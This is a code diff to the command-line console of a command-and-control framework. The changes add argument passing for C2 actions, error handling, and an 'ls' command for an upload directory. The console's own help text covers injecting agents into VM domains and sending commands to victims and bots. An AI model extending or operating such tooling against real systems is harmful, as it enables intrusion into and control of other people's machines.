@@ -1,5 +1,6 @@
 import datetime
 import types
+import os
 from vm_drivers import list_domains, inject_domain, InvalidDomain, InvalidSyscall
 from config.conf_manager import read_config, pretty_print_config
 from c2.c2_server import start_multithreaded_c2, list_c2_connections, send_c2_command, read_c2_log, InvalidConnUUID, NotAliveConnection
@@ -105,8 +106,8 @@ def c2action(_config, _offsets, _args):
     if action not in available:
         print("Invalid action. Use 'c2listactions' to see the available actions")
     else:
-        action_obj: c2actions.C2Action = c2actions.__getattribute__(action)()
         try:
+            action_obj: c2actions.C2Action = c2actions.__getattribute__(action)(*_args[2:])
             cmd_indexes_list = action_obj.performAction(conn_uuid)
             cmd_indexes_list = ", ".join([str(i) for i in cmd_indexes_list])
             print(f"Action completed. Command indexes: {cmd_indexes_list}\n"
@@ -118,6 +119,10 @@ def c2action(_config, _offsets, _args):
             print("Invalid connection UUID")
         except NotAliveConnection:
             print("Can't send commands to dead bots")
+        except TypeError:
+            print("Invalid number of arguments for action")
+        except FileNotFoundError:
+            print("Error: an action tried to read a non-existent file on the local file system")
 
 
 def c2operation(_config, _offsets, _args):
@@ -224,23 +229,29 @@ def c2listfacts(_config, _offsets, _args):
         print("Invalid connection UUID")
 
 
+def ls(_config, _offsets, _args):
+    files = os.listdir('/usr/src/app/c2/connections/upload_dir')
+    files = "\t".join(files)
+    print(files)
+
+
 def command_line_interface(_config, _offsets, stream_req_handler=None):
     options = ["domlist", "dominject", "c2list", "c2send", "c2read", "c2action", "c2operation",
                "c2getfact", "c2setfact", "c2listactions", "c2listops", "c2describeaction",
-               "c2describeop", "c2listfacts", "showconf", "modconf", "quit", "help", "info"]
+               "c2describeop", "c2listfacts", "ls", "showconf", "modconf", "quit", "help", "info"]
     funcs = {'domlist': domlist, 'dominject': dominject, 'c2list': c2list, 'c2send': c2send,
              'c2read': c2read, 'c2action': c2action, 'c2operation': c2operation,
              'c2getfact': c2getfact, 'c2setfact': c2setfact, 'c2listactions': c2listactions,
              'c2listops': c2listops, 'c2describeaction': c2describeaction, 'c2describeop': c2describeop,
-             'c2listfacts': c2listfacts, 'showconf': showconf, 'modconf': modconf}
+             'c2listfacts': c2listfacts, 'ls': ls, 'showconf': showconf, 'modconf': modconf}
     infos = {'domlist': 'Usage: domlist\nList available domains',
              'dominject': 'Usage: dominject <domain>\nInject agent into domain',
              'c2list': 'Usage: c2list\nList all connections to C2 server',
-             'c2send': 'Usage: c2send <conn_uuid> <cmd_arg0> ... <cmd_argN>\nSend command to specified victim',
+             'c2send': 'Usage: c2send <conn_uuid> [cmd_arg0] ... [cmd_argN]\nSend command to specified victim',
              'c2read': 'Usage: c2read <conn_uuid> [cmd_index]\n'
                        'Read data received upon connection if no cmd_index is specified, otherwise read '
                        'command and command output of index specified',
-             'c2action': 'Usage: c2action <conn_uuid> <action_name>\n'
+             'c2action': 'Usage: c2action <conn_uuid> <action_name> [action_arg0] ... [action_argN]\n'
                          'Start specified action against specified target, '
                          'performing it synchronously and setting facts',
              'c2operation': 'Usage: c2operation <conn_uuid> <operation_name>\n'
@@ -259,6 +270,7 @@ def command_line_interface(_config, _offsets, stream_req_handler=None):
                              'Obtain details about the specified operation',
              'c2listfacts': 'Usage: c2listfacts <conn_uuid>\n'
                             'List fact names available for the specified connection',
+             'ls': 'Usage: ls\nList files in the upload directory, useful for the write_file action',
              'showconf': 'Usage: showconf\nShow configuration',
              'modconf': 'Usage: modconf <conf_parameter> <new_value>\nChange value of specified parameter\n'
                         f'Changeable values: {", ".join(changeable)}\n'
